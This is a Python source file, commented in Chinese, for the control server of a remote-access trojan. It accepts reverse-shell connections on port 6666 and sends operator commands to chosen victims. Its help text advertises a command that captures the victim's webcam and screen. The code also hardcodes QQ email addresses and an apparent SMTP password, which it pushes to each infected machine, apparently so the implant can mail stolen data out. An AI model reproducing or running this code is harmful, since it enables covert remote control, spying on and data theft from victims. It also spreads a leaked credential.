from socket import *
import threading
import time
import re

#服务端发送命令

s=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
s.bind(('',6666))#绑定端口
s.listen(1)#开始监听一个队列

user_socket = []
user_addr = []

sender = '1012542296@qq.com'

receivers = '1661463647@qq.com'  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱

password = 'fxuchxyyfohwbdgd'

smtp_server = 'smtp.qq.com'

start_time = time.time()

def command_exec(number):
    global user_socket
    global user_addr
    global start_time
    serial_num = number - 1
    sock = user_socket[serial_num]

    while True:
        #心跳
        #time_pass = time.time()
        #if time_pass - start_time > 10:
        #    sock.send('heartbeat'.encode())
        #    sock.recv(1024)
        #    start_time = time_pass

        try:
            code=input('[+] %s:%s >>:'%(user_addr[serial_num][0],user_addr[serial_num][1]))

            if code == '':
                continue

            if code == 'exit':
                s.close()
                break
            sock.send(code.encode())
            result=sock.recv(10240)
            print(result.decode())
        except:
            print('[-] shell已下线或连接失败')
            user_addr.remove(user_addr[serial_num])
            user_socket.remove(user_socket[serial_num])
            break


def check_list():
    for i in range(0,len(user_addr)):
        print('+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+')
        print(' %s  |  %s:%s  '%(i+1,user_addr[i][0],user_addr[i][1]))
    print('+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+')
    
def help_list():
    print(
    """
    主界面指令如下:
    [help]        查看帮助
    [shell 序号]  与指定shell进行交互
    [shell list]  查看可用shell

    交互式界面指令如下：
    [havealook]   发送摄像头及屏幕截图
    """
    )

def order_input():
    global user_socket
    global user_addr

    while True:
        order = input('[+] server >>:')

        if re.match(r'\bshell\s\d{1,3}',order):
            num = int(re.findall(r'\d{1,3}',order)[0])
            if num > len(user_addr) or num < 0:
                print('[-] 没有该shell序号')
                continue
            command_exec(num)
            continue
        
        if re.match(r'\bshell\slist',order):
            check_list()
            continue
        
        if re.match(r'\bhelp',order):
            help_list()
            continue

        else:
            print('[-] 指令有误')
        
def recv_shell():
    while True:
        try:
            sock,addr=s.accept()#返回两次 第一次返回连接地址 二 端口号
            print ('\nshell已连接：%s:%s\n[+] server >>:'%(addr[0],addr[1]))
            user_socket.append(sock)
            user_addr.append(addr)
            sock.send(sender.encode())
            time.sleep(1)
            sock.send(receivers.encode())
            time.sleep(1)
            sock.send(password.encode())

        except:
            continue

    s.close()


thread_order_input = threading.Thread(target=order_input)
thread_recv_shell = threading.Thread(target=recv_shell)

thread_order_input.start()
thread_recv_shell.start()

